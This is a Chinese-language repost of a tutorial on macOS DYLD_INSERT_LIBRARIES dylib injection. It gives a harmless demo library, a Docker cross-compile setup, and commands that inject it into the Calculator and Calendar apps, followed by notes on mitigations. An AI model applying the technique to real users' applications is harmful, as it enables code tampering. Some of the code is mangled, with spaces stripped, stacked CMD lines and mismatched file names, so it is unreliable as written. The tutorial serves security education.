> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531157&idx=1&sn=67508555340771b3d437df6041c0f6aa

#  MacOS 黑客攻击（二）：经典 macOS 应用程序注入技巧。简单 C 语言示例  
 Ots安全   2025-06-20 06:22  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
网络安全研究者  
@cocomelonckz  
在其X账号上发布了一篇引人注目的帖子（ID: 1935918193916494117），揭露了macOS系统中一个名为DYLD_INSERT_LIBRARIES的经典漏洞利用技术。该技术最初用于合法的调试和测试目的，但如今却被高级持续性威胁（APT）组织如APT34（OILRIG）和APT10（Red Apollo）等恶意攻击者利用，成功将恶意动态链接库（dylib）注入运行中的应用程序，从而绕过macOS的安全机制。这篇文章详细介绍了这一注入技巧的工作原理：通过设置环境变量，攻击者可以将恶意代码加载到目标应用内存中，与应用共享相同权限，从而窃取敏感数据或操控行为。  
  
  
该研究进一步通过一个实际案例展示其威胁性，涉及将恶意dylib注入macOS的计算器和日历应用，并利用Docker进行跨平台编译。尽管macOS自10.12版本起引入了系统完整性保护（SIP）和强化运行时（Hardened Runtime）等安全措施来缓解此类攻击，但用户级进程仍可能受影响。根据MITRE ATT&CK框架关于进程注入的文档，这一技术仍对现代系统构成现实威胁。文章不仅为恶意软件研究人员和红队提供了新工具，也提醒蓝队提高警惕，是一份兼具教育意义和实战价值的资源。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGjaCzWcIXE8UJg46BSb7nQRAgIYIw7eES63bP3sRFJCeIgWtB6B44rg/640?wx_fmt=png&from=appmsg "")  
  
这篇文章是关于 macOS/Apple 黑客攻击和恶意软件系列文章的下一篇。在本文中，我将向您介绍如何在 macOS 中使用一种“经典”的注入技巧。macOS 以其强大的安全措施而闻名，但与所有操作系统一样，它仍然存在一些可被攻击者利用的漏洞。其中一种漏洞利用工具，DYLD_INSERT_LIBRARIES提供了一种将动态库 (dylib) 注入正在运行的应用程序中的有效工具。此技巧允许攻击者通过注入自己的代码、绕过传统的安全机制以及窃取或操纵敏感数据来篡改 macOS 应用程序。  
  
DYLD_INSERT_LIBRARIES 的强大功能  
  
先简单介绍一下理论。“DYLD_INSERT_LIBRARIES”是一个环境变量，用于在正在运行的应用程序加载之前插入动态库。这是 macOS 动态链接器 (dyld) 的内置功能。这项技术的关键优势在于，它允许攻击者无需管理员权限或 root 权限即可将代码注入用户态进程。注入的动态库以与目标应用程序相同的权限运行，这使其成为攻击者的强大工具。  
  
虽然DYLD_INSERT_LIBRARIES它通常用于合法的开发目的，例如调试和测试库，但它很容易被滥用，将恶意代码注入任何正在运行的应用程序中。  
  
它是如何工作的？  
  
首先，攻击者将环境变量设置DYLD_INSERT_LIBRARIES为指向恶意dylib。假设我们有一个“恶意”dylib：。bad.dylib可以在终端中使用以下命令完成此操作：  
  

```
DYLD_INSERT_LIBRARIES=/path/to/bad.dylib <application>
```

  
  
然后，当应用程序运行时，dyld 链接器会先加载恶意 dylib，然后再加载应用程序的任何常规动态库。注入的代码现在可以与应用程序的内存交互，监视其活动或修改其行为。  
  
实例  
  
让我们分析一下恶意攻击者如何DYLD_INSERT_LIBRARIES劫持一个简单的 macOS 应用程序。攻击者首先创建一个恶意 dylib，并将其注入到目标应用程序中。以下是一个用 C 语言编写的恶意 dylib 示例，它在加载时会打印一条消息并将其记录到 syslog 中：  
  

```
/*
 * hello.c
 * simple mac dylib
 * author @cocomelonc
 * https://cocomelonc.github.io/macos/2025/06/19/malware-mac-2.html
 */
#include<stdio.h>
#include<syslog.h>

__attribute__((constructor))
staticvoidcustomConstructor(int argc, constchar **argv){
  printf(&#34;Meow-meow from dylib!\n&#34;);
  syslog(LOG_ERR, &#34;dylib injection successful %s\n&#34;, argv[0]);
}
```

  
  
如你所见，逻辑非常简单：这个dylib只是打印Meow-meow from dylib!到控制台，并将事件记录到syslog中。它的目的是记录注入的事实。  
  
接下来，我们需要选择一个目标 macOS 应用程序。为了简单起见，我们使用一个基本的 Hello World 应用程序。以下是它的简单 C 代码：  
  

```
/*
 * hello.c
 * simple mac victim app
 * author @cocomelonc
 * https://cocomelonc.github.io/macos/2025/06/19/malware-mac-2.html
 */
#include<stdio.h>

intmain(){
  printf(&#34;Hello, macOS World!\n&#34;);
  return0;
}
```

  
  
正如您所见，只需打印消息。  
  
演示  
  
让我们来看看实际操作。对于 Linux 编译，我像往常一样使用我最喜欢的 Docker 交叉编译器。这是我的项目结构：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGoKtTzjaI6pjQa9Aj9nib1L1GWVrxxictgfx6to9iaxlQxsibNLRTheuj9g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGpAyDaljzPiaqiasetygAelgdPiaSxmrdibaoA8ibp1PwC6bgg07tAZicBllg/640?wx_fmt=png&from=appmsg "")  
  
因此，为了进行编译，请准备 Dockerfile：  
  

```
# use the macOS cross-compiler image as the base
FROM ghcr.io/shepherdjerred/macos-cross-compiler:latest

# update package listand install required packages
RUN apt-getupdate && \
    apt-get install -y \
    curl \
    pkg-config \
    libssl-dev \
    gcc-mingw-w64 \
    clang \
    cmake \
    make \
    zlib1g-dev

# copy macOS project code into the container
COPY ./hack /app

# set the working directory
WORKDIR /app

# execute the hack_compiler script and keep the container alive
CMD [&#34;/bin/bash&#34;, &#34;-c&#34;, &#34;x86_64-apple-darwin24-g++ /app/hello.c -o /app/hello -static-libgcc -static-libstdc++ -O3&#34;]
CMD [&#34;/bin/bash&#34;, &#34;-c&#34;, &#34;x86_64-apple-darwin24-g++ -dynamiclib -static-libgcc -static-libstdc++ -O3 -o /app/hack.dylib /app/hack.c&#34;]
CMD [&#34;/bin/bash&#34;, &#34;-c&#34;, &#34;tail -f /dev/null&#34;]
```

  
  
和 docker compose 文件：  
  

```
networks:
  mac_net:

services:
  hack:
    build:
      context: ./injection
    volumes:
      - ./injection/hack:/app
    working_dir: /app
    networks:
      - mac_net
```

  
  
然后只需运行以下命令进行交叉编译：  
  

```
docker compose build
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGmQ21zkhzNiahoaHMwqBQw1pSr9NLMiamqclMGic7IqWFK3MrYLqk6DJBg/640?wx_fmt=png&from=appmsg "")  
  
  

```
docker compose up -d
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGZsjcJFq5IKuJT2PicmIhDQtJrU1guWvNib7icqWteQSNWLb842OB2m81A/640?wx_fmt=png&from=appmsg "")  
  
检查编译的二进制文件：  
  

```
docker exec -it 3b592097 bash
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGicyUKxbnxohuM1ib6Zfoe9sc1qeibHFqUCEdW6rlRemm4X12JK5kbJe8g/640?wx_fmt=png&from=appmsg "")  
  
最后，将二进制文件复制到受害者的机器（macOS Sonoma我这里是虚拟机）。为了检查正确性，运行受害者的应用程序：  
  

```
./hello
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGHVqpr81LmQjOrK3a2SZbAnSGibE34zE12Ww0CZdywbu5cTBMlQJg82w/640?wx_fmt=png&from=appmsg "")  
  
然后进行注入技巧：  
  

```
DYLD_INSERT_LIBRARIES=hack.dylib ./hello
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGicrlDbAGgnUJaVH3XH1HVLYuX5q4N3BA4mQtVMyvqDH8dqIpsQkg7rQ/640?wx_fmt=png&from=appmsg "")  
  
从日志中检查：  
  

```
log show --last10s | grep&#34;injection&#34;
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGr2KIg4ct1M8DDltjBHNfItl7UXNb0sNtRGK4CZtavjFUkAgicDHnZ7w/640?wx_fmt=png&from=appmsg "")  
  
正如您所见，一切都运行正常！=^..^=  
  
那么 macOS 应用程序呢？让我们将计算器设置为受害者应用程序并运行：  
  

```
cd /System/Applications/Calculator.app/Contents/MacOS/
DYLD_INSERT_LIBRARIES=~/Desktop/hack.dylib ./Calculator
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGThfw9w57KaWLEVmjriavzTw701Hc58eBpmbqIYrnQczP6XnsEhGjE5A/640?wx_fmt=png&from=appmsg "")  
  
检查系统日志：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGw0PiaOUk4iaiaKkdAZCR9bmibJJO9BWE1apApCu5NwJNE3S7jgiammeFuNQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGmibHm5ycqqjyS3sOib1ibgGPkCjHAoUbFOOGwvFdXSSDXS8RUPILhqqCA/640?wx_fmt=png&from=appmsg "")  
  
日历应用程序作为受害者应用程序：  
  

```
cd /System/Applications/Calendar.app/Contents/MacOS/
DYLD_INSERT_LIBRARIES=~/Desktop/hack.dylib ./Calendar
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGLjy0GcBm80vSLajgOg2nTYz1U2icnFZoIaK8qFJy8UPicp7iaumuXGvxg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapG9mZSysH6icwy2LldIAv93FsX7BbUbiaSV40B2opOAkZDDV9gtMDmIOqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taczD1gdccGzoIdyWZg7FapGs4gI91vY00bw2cKreQcjM4fBCfEZEHmOkUohd6QxDGhRnvMoZrn9Ng/640?wx_fmt=png&from=appmsg "")  
  
如您所见，在这种情况下一切都运行正常：这表明注入成功，并且攻击者的 dylib 现在正在与应用程序一起运行！=^..^=  
  
然而，macOS 引入了多项安全功能，例如Hardened Runtime和 Library Validation，以缓解这些攻击。通过启用这些保护措施，开发者可以显著降低 macOS 遭受 dylib 注入攻击的风险。  
  
DYLD_INSERT_LIBRARIES注入可以在裸机 macOS 以及虚拟化 macOS 环境（例如我们的 Quickemu 虚拟 macOS 设置）上运行，但需要注意一些重要的安全注意事项和措施。例如，SIP（系统完整性保护）是 macOS 中的一项安全功能，它限制某些系统修改，包括将动态库注入系统进程和操作系统的其他关键区域。此外，DYLD_INSERT_LIBRARIES在裸机 macOS 上进行注入仍然适用于用户态进程，但 SIP 会阻止动态库注入系统级进程。  
  
众所周知， APT34（又名 OILRIG）使用代码注入技术与 macOS 和 Linux 系统交互，利用系统安全机制中的漏洞和弱点将代码注入正在运行的进程中。  
  
另一个先进的我国攻击组织APT10（又名“红色阿波罗”）已知会使用进程注入和 DLL 劫持等技术来操纵和监控系统。这在概念上与 DYLD_INSERT_LIBRARIES 类似，因为它涉及将恶意代码注入现有应用程序。  
  
我希望这篇文章对恶意软件研究人员、macOS/Apple 安全研究人员、C/C++ 程序员有所帮助，让蓝队成员了解这种有趣的技术，并为红队武器库增添武器。  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
